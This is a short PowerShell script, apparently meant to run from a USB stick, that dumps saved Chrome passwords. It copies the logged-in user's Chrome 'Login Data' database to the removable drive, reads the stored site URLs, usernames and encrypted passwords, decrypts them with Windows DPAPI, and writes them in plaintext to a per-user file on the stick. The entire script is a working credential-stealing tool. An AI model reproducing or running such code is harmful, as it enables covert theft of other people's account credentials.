
#Gets Letter of current input drive
$startDir = gwmi cim_logicaldisk | ? drivetype -eq 2
$startDir = $startDir.DeviceID + "\ChromePasswordDumper"
if (!(Test-Path $startDir\Passwords)){ 
  new-item -Name Passwords -ItemType directory -Path $startDir
}

#Switches to C directory
cd C:\

#Gets Login Data for password Dumping
$pathStart = "C:\Users\";
$pathEnd = "\AppData\Local\Google\Chrome\User Data\Default\Login Data";
$path = $pathStart + $env:UserName + $pathEnd;
Copy-Item $path -Destination $startDir

#
#Allows the us of the windows CryptUnprotectData function 
#https://docs.microsoft.com/en-us/windows/desktop/api/dpapi/nf-dpapi-cryptunprotectdata
#
Add-Type -AssemblyName System.Security

#Get the password to encrypt this is a byte array
Import-Module $startDir\PSSQLite

$Database = $startDir + "\Login Data"
$Query = "SELECT origin_url, username_value, password_value FROM logins"


#SQLite will create Names.SQLite for us
$data = Invoke-SqliteQuery -Query $Query -DataSource $Database
$line = "Origin URL`t Username `t Password";
$pwd_path = $startDir + '\Passwords\' + $env:UserName + '-pwds.txt';
for($i = 0; $i -lt $data.Count; $i++){
  $EncryptedBytes = $data[$i].password_value;
  $data[$i].password_value =  (([Text.Encoding]::ASCII).GetString([Security.Cryptography.ProtectedData]::Unprotect($EncryptedBytes, $Null, [Security.Cryptography.DataProtectionScope]::LocalMachine)));
  $line = $data[$i].origin_url + "`t" + $data[$i].username_value + "`t" + $data[$i].password_value;
  Add-Content $pwd_path $line;

}
Write-Host -NoNewLine '[ENTER]';
$null = $Host.UI.RawUI.ReadKey('NoEcho,IncludeKeyDown');